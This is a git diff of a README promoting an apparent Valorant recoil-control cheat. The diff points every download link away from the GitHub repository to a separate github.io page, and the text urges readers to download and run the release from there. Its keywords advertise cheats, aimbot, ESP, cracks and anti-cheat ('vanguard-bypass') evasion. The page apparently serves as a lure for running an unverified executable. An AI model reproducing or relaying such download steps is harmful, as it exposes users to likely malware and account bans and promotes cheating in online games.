@@ -1,6 +1,6 @@
 # 🎯 valorant-no-recoil-script-2026 - Recoil Control Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_No_Recoil_Script_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Becsi1980/valorant-no-recoil-script-2026)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_No_Recoil_Script_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://becsi1980.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the Valorant No Recoil Script
 
 Visit this link to download the application:
 
-**[https://github.com/Becsi1980/valorant-no-recoil-script-2026](https://github.com/Becsi1980/valorant-no-recoil-script-2026)**
+**[https://becsi1980.github.io](https://becsi1980.github.io)**
 
 Once you click the link, you'll land on the download page. Look for the download button or the latest release file and click it. The download will start automatically.
 
@@ -126,6 +126,6 @@ If you encounter any issues or have questions, check the repository's issues sec
 
 ---
 
-**Download again:** [https://github.com/Becsi1980/valorant-no-recoil-script-2026](https://github.com/Becsi1980/valorant-no-recoil-script-2026)
+**Download again:** [https://becsi1980.github.io](https://becsi1980.github.io)
 
 Keywords: valorant-no-recoil, recoil-script, mouse-macro, no-recoil-2026, valorant-cheat, valorant-hack, valorant-undetected, vanguard-bypass, spray-control, recoil-control, fps-hack, free-valorant-cheat, valorant-external, valorant-aimbot, valorant-esp, valorant-crack, valorant-free, counter-strike, valorant-2026
